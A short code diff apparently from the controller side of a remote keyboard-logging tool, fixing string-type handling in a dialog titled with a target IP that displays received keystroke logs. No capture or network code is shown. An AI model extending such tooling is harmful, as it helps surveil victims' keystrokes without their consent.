@@ -76,7 +76,7 @@ BOOL CKeybdLogDlg::OnInitDialog()
 	CString Title;
 	CString ip(szIP);
 
-	Title.Format(TEXT("[%s] Keyboard Logger"), szIP);
+	Title.Format(TEXT("[%s] Keyboard Logger"), ip);
 	SetWindowText(Title);
 	//
 	m_OfflineRecord.EnableWindow(FALSE);
@@ -92,7 +92,7 @@ BOOL CKeybdLogDlg::OnInitDialog()
 
 LRESULT CKeybdLogDlg::OnLogData(WPARAM wParam, LPARAM lParam)
 {
-	TCHAR*szLog = (TCHAR*)wParam;
+	CHAR*szLog = (CHAR*)wParam;
 	BOOL Append = lParam;
 	if (!Append)
 	{
@@ -100,7 +100,7 @@ LRESULT CKeybdLogDlg::OnLogData(WPARAM wParam, LPARAM lParam)
 		m_Log.SetWindowText(TEXT(""));
 	}
 	m_Log.SetSel(-1);
-	m_Log.ReplaceSel(szLog);
+	m_Log.ReplaceSel(CString(szLog));
 	return 0;
 }
 
